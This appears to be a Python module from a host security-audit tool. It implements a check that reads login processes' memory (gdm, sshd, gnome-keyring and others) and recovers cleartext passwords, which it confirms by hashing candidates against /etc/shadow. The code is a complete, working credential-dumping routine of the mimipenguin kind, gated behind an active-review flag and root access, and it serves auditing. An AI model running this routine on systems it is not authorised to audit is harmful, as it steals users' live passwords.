"""Native in-memory credential recovery — the actual mimipenguin technique.

Where EXT-CRED-4/7 read the kernel-exposed environment/argv of a process, this
goes after the thing mimipenguin goes after: the **cleartext login password
sitting in a process's heap**. For a small set of processes that handle a login
(gdm, lightdm, gnome-keyring, sshd, vsftpd, …) it:

1. reads the process's readable heap/anon regions via ``/proc/<pid>/maps`` +
   ``/proc/<pid>/mem`` (bounded, tolerant of unreadable regions),
2. extracts printable candidate strings near known per-process *needle* anchors,
3. **confirms** each candidate by hashing it with the matching ``/etc/shadow``
   scheme and comparing to the stored hash — so a finding is only ever raised on
   a cryptographically verified password, never a guess.

It is implemented in pure standard library (no third-party deps): the sha-crypt
families (``$5$``/``$6$``) are computed natively with :mod:`hashlib`, and other
schemes (yescrypt ``$y$``, bcrypt ``$2$``, …) fall back to the host's
``crypt(3)`` via the stdlib :mod:`crypt` module or :mod:`ctypes`/libxcrypt.

Reading another process's memory is intrusive and root-only, so this check only
runs under ``--active-review`` (``ctx.active_review``) and only against the local
host. Everything is bounded and every failure path degrades to SKIP/MANUAL.
"""

from __future__ import annotations

import os
import string
from typing import Dict, List, Optional, Sequence, Tuple

from ...core import Confidence, Level, Outcome, Severity, Status, check
from ..extended import EXTENDED_FRAMEWORK
from .credentials import _redact

# --------------------------------------------------------------------------- #
# Shadow-hash verification (pure-Python sha-crypt + libc crypt fallback)
# --------------------------------------------------------------------------- #

# The crypt/bcrypt base64 alphabet (NOT standard base64).
_B64 = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# Byte-interleave order glibc uses when base64-encoding the final digest, as
# (b2, b1, b0, nchars) triples. Lifted from sha512-crypt.c / sha256-crypt.c.
_ORDER_SHA512 = [
    (0, 21, 42, 4), (22, 43, 1, 4), (44, 2, 23, 4), (3, 24, 45, 4), (25, 46, 4, 4),
    (47, 5, 26, 4), (6, 27, 48, 4), (28, 49, 7, 4), (50, 8, 29, 4), (9, 30, 51, 4),
    (31, 52, 10, 4), (53, 11, 32, 4), (12, 33, 54, 4), (34, 55, 13, 4), (56, 14, 35, 4),
    (15, 36, 57, 4), (37, 58, 16, 4), (59, 17, 38, 4), (18, 39, 60, 4), (40, 61, 19, 4),
    (62, 20, 41, 4), (-1, -1, 63, 2),
]
_ORDER_SHA256 = [
    (0, 10, 20, 4), (21, 1, 11, 4), (12, 22, 2, 4), (3, 13, 23, 4), (24, 4, 14, 4),
    (15, 25, 5, 4), (6, 16, 26, 4), (27, 7, 17, 4), (18, 28, 8, 4), (9, 19, 29, 4),
    (-1, 31, 30, 3),
]


def _b64_digest(digest: bytes, order) -> str:
    out = []
    for b2, b1, b0, n in order:
        v = ((digest[b2] if b2 >= 0 else 0) << 16
             | (digest[b1] if b1 >= 0 else 0) << 8
             | (digest[b0] if b0 >= 0 else 0))
        for _ in range(n):
            out.append(_B64[v & 0x3F])
            v >>= 6
    return "".join(out)


def _sha_crypt(key: bytes, salt: bytes, rounds: int, ctor, dlen: int) -> bytes:
    """The Drepper sha-crypt key-derivation, returning the final digest bytes."""
    salt = salt[:16]
    klen = len(key)
    a = ctor(); a.update(key); a.update(salt)
    b = ctor(); b.update(key); b.update(salt); b.update(key)
    bd = b.digest()
    cnt = klen
    while cnt > dlen:
        a.update(bd); cnt -= dlen
    a.update(bd[:cnt])
    n = klen
    while n:
        a.update(bd if (n & 1) else key)
        n >>= 1
    ad = a.digest()
    dp = ctor()
    for _ in range(klen):
        dp.update(key)
    dpd = dp.digest()
    p = (dpd * (klen // dlen + 1))[:klen]
    ds = ctor()
    for _ in range(16 + ad[0]):
        ds.update(salt)
    dsd = ds.digest()
    s = (dsd * (len(salt) // dlen + 1))[:len(salt)]
    c = ad
    for i in range(rounds):
        ctx = ctor()
        ctx.update(p if (i & 1) else c)
        if i % 3:
            ctx.update(s)
        if i % 7:
            ctx.update(p)
        ctx.update(c if (i & 1) else p)
        c = ctx.digest()
    return c


def _sha512_crypt(key: bytes, salt: str, rounds: int, explicit: bool) -> str:
    import hashlib
    digest = _sha_crypt(key, salt.encode("latin-1"), rounds, hashlib.sha512, 64)
    prefix = f"$6${'rounds=%d$' % rounds if explicit else ''}{salt}$"
    return prefix + _b64_digest(digest, _ORDER_SHA512)


def _sha256_crypt(key: bytes, salt: str, rounds: int, explicit: bool) -> str:
    import hashlib
    digest = _sha_crypt(key, salt.encode("latin-1"), rounds, hashlib.sha256, 32)
    prefix = f"$5${'rounds=%d$' % rounds if explicit else ''}{salt}$"
    return prefix + _b64_digest(digest, _ORDER_SHA256)


try:  # libc crypt(3) — covers yescrypt/bcrypt/etc. on the real target
    import crypt as _cryptmod
except Exception:  # pragma: no cover - removed in Python 3.13
    _cryptmod = None


def _libc_crypt(word: bytes, setting: str) -> Optional[str]:
    if _cryptmod is not None:
        try:
            return _cryptmod.crypt(word.decode("latin-1"), setting)
        except Exception:
            pass
    try:
        import ctypes
        import ctypes.util
        name = ctypes.util.find_library("crypt") or "libcrypt.so.1"
        lib = ctypes.CDLL(name)
        lib.crypt.restype = ctypes.c_char_p
        lib.crypt.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
        res = lib.crypt(word, setting.encode("latin-1"))
        return res.decode("latin-1") if res else None
    except Exception:
        return None


def _verify_password(word, hashval: str) -> bool:
    """True if ``word`` hashes to ``hashval`` under that shadow entry's scheme."""
    key = word if isinstance(word, bytes) else word.encode("latin-1")
    if not hashval.startswith("$"):
        return False
    parts = hashval.split("$")
    if len(parts) < 4:
        return False
    scheme = parts[1]
    if scheme in ("5", "6"):
        if parts[2].startswith("rounds="):
            try:
                rounds = int(parts[2][len("rounds="):])
            except ValueError:
                return False
            rounds = max(1000, min(rounds, 999_999_999))
            salt, explicit = parts[3], True
        else:
            rounds, salt, explicit = 5000, parts[2], False
        fn = _sha512_crypt if scheme == "6" else _sha256_crypt
        try:
            return fn(key, salt, rounds, explicit) == hashval
        except Exception:
            return False
    got = _libc_crypt(key, hashval)
    return got == hashval if got else False


# --------------------------------------------------------------------------- #
# Memory acquisition + candidate extraction (local-only, bounded)
# --------------------------------------------------------------------------- #

# Per-process needle anchors near which a login password tends to sit (the
# mimipenguin approach). comm is truncated to 15 chars by the kernel, so keys
# are matched as prefixes.
_TARGETS: Dict[str, List[bytes]] = {
    "gdm-password": [b"_pammodutil_getpwnam_", b"gkr_system_authtoken"],
    "gdm-session-wor": [b"_pammodutil_getpwnam_"],
    "gnome-keyring-d": [b"libgck-1.so.0", b"_pammodutil_getpwnam_", b"gkr_system_authtoken"],
    "lightdm": [b"_pammodutil_getpwnam_"],
    "vsftpd": [b"::"],
    "sshd": [b"_unix_verify_password", b"sudo"],
    "polkitd": [b"_pammodutil_getpwnam_"],
    "sssd": [b"_pammodutil_getpwnam_"],
    "login": [b"_pammodutil_getpwnam_"],
}

_MAX_PER_PROC = 128 * 1024 * 1024     # cap bytes read per process
_MAX_REGION = 256 * 1024 * 1024       # skip absurdly large single regions
_PRINTABLE = frozenset(ord(c) for c in (string.ascii_letters + string.digits + string.punctuation))


def _needles_for(comm: str) -> Optional[List[bytes]]:
    for key, needles in _TARGETS.items():
        if comm == key or comm.startswith(key) or key.startswith(comm):
            return needles
    return None


def _read_regions(pid: str, max_total: int = _MAX_PER_PROC) -> List[bytes]:
    """Readable heap/anon regions of a process, bounded. [] on any failure."""
    try:
        maps = open(f"/proc/{pid}/maps", "r").read()
    except OSError:
        return []
    blobs: List[bytes] = []
    total = 0
    try:
        mem = open(f"/proc/{pid}/mem", "rb", buffering=0)
    except OSError:
        return []
    with mem:
        for line in maps.splitlines():
            cols = line.split()
            if len(cols) < 5 or "r" not in cols[1]:
                continue
            path = cols[5] if len(cols) >= 6 else ""
            if path and path not in ("[heap]", "[stack]") and not path.startswith("[anon"):
                continue
            try:
                lo, hi = (int(x, 16) for x in cols[0].split("-"))
            except ValueError:
                continue
            size = hi - lo
            if size <= 0 or size > _MAX_REGION:
                continue
            size = min(size, max_total - total)
            if size <= 0:
                break
            try:
                mem.seek(lo)
                blob = mem.read(size)
            except (OSError, ValueError, OverflowError):
                continue
            if blob:
                blobs.append(blob)
                total += len(blob)
            if total >= max_total:
                break
    return blobs


def _ascii_runs(data: bytes, minlen: int, maxlen: int):
    run = bytearray()
    for byte in data:
        if byte in _PRINTABLE:
            run.append(byte)
            if len(run) > maxlen:
                run.clear()  # too long to be a password; reset
        else:
            if minlen <= len(run) <= maxlen:
                yield bytes(run)
            run.clear()
    if minlen <= len(run) <= maxlen:
        yield bytes(run)


def _candidates(blobs: Sequence[bytes], needles: Sequence[bytes],
                window: int = 128, minlen: int = 5, maxlen: int = 64,
                cap: int = 6000) -> List[bytes]:
    """Printable candidate strings near the needle anchors (deduped, capped)."""
    found = set()
    for blob in blobs:
        for needle in needles:
            start = 0
            while True:
                i = blob.find(needle, start)
                if i < 0:
                    break
                lo = max(0, i - window)
                for s in _ascii_runs(blob[lo:i + window], minlen, maxlen):
                    found.add(s)
                    if len(found) >= cap:
                        return list(found)
                start = i + len(needle)
    return list(found)


def _shadow_users(ctx) -> List[Tuple[str, str]]:
    """(name, hash) for accounts with a real, hashed password in /etc/shadow."""
    users = []
    for s in ctx.shadow_entries():
        pw = s.get("passwd", "")
        if pw.startswith("$") and pw.count("$") >= 3:
            users.append((s["name"], pw))
    return users


# --------------------------------------------------------------------------- #
# The check
# --------------------------------------------------------------------------- #

@check(
    id="EXT-CRED-16",
    title="Recover cleartext credentials from process memory (active review)",
    section="EXT.Credentials",
    severity=Severity.CRITICAL,
    levels=(Level.L2,),
    framework=EXTENDED_FRAMEWORK,
    rationale=(
        "Login processes (gdm, lightdm, gnome-keyring, sshd, vsftpd, …) can hold the user's cleartext "
        "password in heap memory after authentication. This is the technique mimipenguin uses: read the "
        "process memory, then confirm a recovered candidate against /etc/shadow. A confirmed hit is a live "
        "credential an attacker with root could harvest. Intrusive and root-only — runs only under "
        "--active-review."),
    remediation=(
        "Rotate any recovered credential immediately. Reduce exposure: lock screens drop keyring secrets, "
        "raise kernel.yama.ptrace_scope, and avoid password auth where possible. yescrypt confirmation relies "
        "on the host's libxcrypt crypt(3); sha-crypt ($5$/$6$) is verified natively."),
    references=("https://github.com/huntergregal/mimipenguin",),
    tags=("credentials", "memory", "mimipenguin", "active"),
    attack=("T1003.008", "T1003", "T1555"),
)
def recover_credentials_from_memory(ctx):
    if not ctx.active_review:
        return Outcome.skip(
            "Active memory review is off — pass --active-review to engage in-memory credential "
            "recovery (intrusive, reads process memory, root-only)."
        )
    if not ctx.file_exists("/proc"):
        return Outcome.skip("No /proc filesystem; in-memory recovery not applicable")
    if not ctx.is_local:
        return Outcome.manual(
            "In-memory recovery runs only against the local host (raw process memory cannot be streamed "
            "over SSH) — run 'secbench scan --active-review' on the target itself."
        )
    if not ctx.is_root:
        return Outcome.manual("Root required to read other processes' memory")

    users = _shadow_users(ctx)
    if not users:
        return Outcome.manual("No verifiable /etc/shadow hashes available to confirm recovered candidates")

    try:
        pids = [p for p in os.listdir("/proc") if p.isdigit()]
    except OSError:
        return Outcome.manual("Could not enumerate /proc")

    confirmed: Dict[Tuple[str, str], str] = {}   # (user, comm) -> redacted/raw value
    scanned = 0
    verifications = 0
    vcap = 40_000
    for pid in pids:
        try:
            comm = open(f"/proc/{pid}/comm").read().strip()
        except OSError:
            continue
        needles = _needles_for(comm)
        if not needles:
            continue
        scanned += 1
        blobs = _read_regions(pid)
        if not blobs:
            continue
        for cand in _candidates(blobs, needles):
            if verifications >= vcap:
                break
            for user, hashval in users:
                if (user, comm) in confirmed:
                    continue
                verifications += 1
                if verifications > vcap:
                    break
                if _verify_password(cand, hashval):
                    value = cand.decode("latin-1")
                    confirmed[(user, comm)] = value if ctx.reveal_secrets else _redact(value, False)
        if verifications >= vcap:
            break

    if confirmed:
        evidence = [f"recovered password for '{user}' from {comm} memory: {val}"
                    for (user, comm), val in sorted(confirmed.items())]
        return Outcome(
            status=Status.FAIL,
            summary=f"Recovered {len(confirmed)} cleartext credential(s) from process memory",
            evidence=evidence,
            actual=len(confirmed),
            confidence=Confidence.CERTAIN,
        )
    if scanned:
        return Outcome.passed(
            f"Scanned {scanned} login-related process(es); no validatable credentials recovered from memory")
    return Outcome.passed("No target login processes were running to scan")
